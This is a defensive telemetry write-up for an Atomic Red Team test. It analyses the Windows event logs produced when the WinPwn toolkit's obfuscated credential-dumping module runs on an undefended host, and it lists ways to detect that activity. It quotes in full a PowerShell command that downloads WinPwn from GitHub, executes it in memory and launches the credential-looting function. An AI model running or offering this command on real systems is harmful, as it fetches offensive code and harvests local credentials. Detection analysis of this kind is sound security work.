# T1078.003-6: Local Accounts — WinPwn - Loot Local Credentials (powerhell kittie)

## Technique Context

T1078.003 (Valid Accounts: Local Accounts) covers adversaries who use local account credentials — usernames and passwords or hashes stored on the endpoint itself — to authenticate and move laterally. The access is "valid" in the sense that it uses legitimate credentials rather than exploiting a vulnerability, making detection harder than catching an exploit.

"Powerhell kittie" (`obfuskittiedump`) is a WinPwn module that dumps local credentials using obfuscated PowerShell. WinPwn (by S3cur3Th1sSh1t) is a PowerShell-based offensive toolkit that aggregates and automates a large number of post-exploitation functions. The `obfuskittiedump` function specifically targets local credential stores using obfuscated code paths designed to evade signature-based detection — the "obfusk" in the name is explicit about its intent to avoid AV/EDR interception.

In this test the technique is exercised on an undefended endpoint where Defender has been disabled, so the obfuscation layers designed to evade detection are present but not tested against any active defense. What you get is the complete, uninterrupted execution path of what WinPwn's credential dumping module does when it runs without interference.

## What This Dataset Contains

This dataset captures the full execution of the WinPwn `obfuskittiedump` function on ACME-WS06.acme.local with Defender disabled. The execution runs as `NT AUTHORITY\SYSTEM`.

The Security log (EID 4688) and Sysmon (EID 1) both record the complete PowerShell invocation:

```
"powershell.exe" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
obfuskittiedump -consoleoutput -noninteractive}
```

The execution pattern is a classic in-memory loading approach: `iex(new-object net.webclient).downloadstring(...)` downloads the WinPwn PowerShell script directly into memory and immediately executes it via `Invoke-Expression`, never writing the script to disk. The `-noninteractive` flag tells the module to run without requiring user prompts; `-consoleoutput` directs results to stdout.

The Security channel (46 events total) breaks down as: 22 EID 4688 (process creation) and 5 EID 4798 (user's local group membership enumerated). The EID 4798 events are part of the credential reconnaissance component — WinPwn's module enumerates local group memberships using WMI (the enumerating process is `C:\Windows\System32\wbem\WmiPrvSE.exe`). EID 4798 events record each user's group enumeration:

- Administrator (SID S-1-5-21-1024873681-3998968759-1653567624-500)
- DefaultAccount (SID S-1-5-21-1024873681-3998968759-1653567624-503)
- Guest (SID S-1-5-21-1024873681-3998968759-1653567624-501)

The WMI channel records a WMI error (EID 5858): `Start IWbemServices::ExecNotificationQuery - ROOT\CIMV2 : SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName = 'wsmprovhost.exe'`. This is WinPwn attempting to monitor for WinRM host processes — a tactic used to detect if a WinRM shell is being established as a response to the activity.

The Sysmon channel (74 events) breaks down as: 43 EID 11 (file creates), 16 EID 7 (image loads), 5 EID 1 (process creates), 4 EID 10 (process access), 3 EID 3 (network connections), 2 EID 17 (named pipe creates), and 1 EID 22 (DNS). The EID 10 (process access) events show PowerShell accessing `whoami.exe` with full access rights (`0x1FFFFF`), which is the ART test framework executing system owner discovery.

One notable Sysmon EID 11 (file create) shows `MsMpEng.exe` (Windows Defender's engine) writing to `C:\Windows\Temp\01dcb40a7134f095` — even though Defender is disabled for real-time protection, the engine process itself is still running and performing background scanning activity. This is characteristic of a "Defender disabled but still installed" environment.

Compared to the defended dataset (41 sysmon, 10 security, 51 PowerShell events), the undefended capture shows substantially more Security log events — particularly the 5 EID 4798 group enumeration events that indicate the credential reconnaissance completed fully. In the defended dataset, Defender's AMSI may have intervened before the enumeration sequence ran to completion.

## What This Dataset Does Not Contain

The actual credential dump output is not visible in event telemetry — the credentials themselves (NTLM hashes, plaintext passwords if extracted) exist only in process memory or stdout during execution and are not logged by Windows event subsystems.

Sysmon EID 3 (network connection) events in the samples do not show the initial download of WinPwn.ps1 from GitHub — the `downloadstring` call that loads WinPwn into memory either occurred before the Sysmon network filter rule fired, or the sample selection did not capture those specific network events (3 EID 3 events are present in total but not shown in the samples).

There are no Sysmon EID 8 (CreateRemoteThread) or LSASS access events visible in this dataset. The `obfuskittiedump` module may use `WMI` or `token impersonation` to access credentials rather than the direct lsass.exe memory reads that would generate EID 10 events against `lsass.exe`.

## Assessment

This dataset provides the full execution sequence of a PowerShell-based credential reconnaissance module: in-memory script loading via `iex(downloadstring(...))`, WMI-based local group enumeration (EID 4799/4798), and the WMI notification query for monitoring WinRM activity (EID 5858). The combination of these indicators tells a coherent story — an attacker loaded an offensive PowerShell framework into memory and ran a credential reconnaissance module that enumerated local users and their group memberships via WMI.

The in-memory loading pattern (`iex(downloadstring(...))`) is significant: it leaves no script file on disk for forensic recovery. The only telemetry showing what was executed is the PowerShell EID 4104 script block logs and the EID 4688/EID 1 process creation command line. This is exactly the evidence gap that modern PowerShell-heavy attacks exploit — no artifact on disk, but the command line and WMI enumeration activity remain visible.

The WMI EID 5858 error event is a useful discriminator: it shows WinPwn attempting to register a WMI event subscription to monitor process creation, a behavior that is not present in typical user activity. The fact that it returned an error (0x80041032 — the subscription was already registered) indicates WinPwn detected an existing subscription and attempted to set one up anyway.

## Detection Opportunities Present in This Data

**Security EID 4688 / Sysmon EID 1 — In-memory PowerShell execution via iex(downloadstring):** The full command line recording `iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/...')` is visible. This specific URL pattern (pinned commit hash in a known offensive GitHub repository) is a direct indicator, but the technique — IEX + DownloadString — is a broadly applicable detection primitive.

**Security EID 4799 — Local group membership enumerated (19 events):** WMI-sourced bulk enumeration of local group memberships across all local accounts, with `WmiPrvSE.exe` as the enumerating process, is anomalous. Normal administrative activity does not enumerate every local user's group membership in rapid succession via WMI.

**Security EID 4798 — User's local group membership enumerated:** Individual user-level group enumeration events for Administrator, DefaultAccount, and Guest accounts, sourced from `WmiPrvSE.exe` under SYSTEM. The combination of multiple 4798 events in a short timeframe from a WMI process is a reliable indicator of automated credential reconnaissance.

**WMI EID 5858 — WMI error for Win32_ProcessStartTrace subscription:** WinPwn's attempt to create a WMI process-start notification subscription for `wsmprovhost.exe` leaves an error record in the WMI Operations log. Process monitoring via WMI event subscriptions is not typical user or application behavior.

**Sysmon EID 10 — Process access with 0x1FFFFF rights:** Full process access requested against `whoami.exe` from PowerShell indicates the ART test framework is using privileged process handles. In a real scenario, 0x1FFFFF (PROCESS_ALL_ACCESS) against LSASS from PowerShell would be the primary credential dumping indicator.

**PowerShell EID 4104 — Script block logging:** Even with in-memory loading, PowerShell's script block logging captures what was executed. The ART test framework activity (module import, Invoke-AtomicTest invocation) is visible, as are the internal PS runtime blocks generated by the WinPwn module execution.
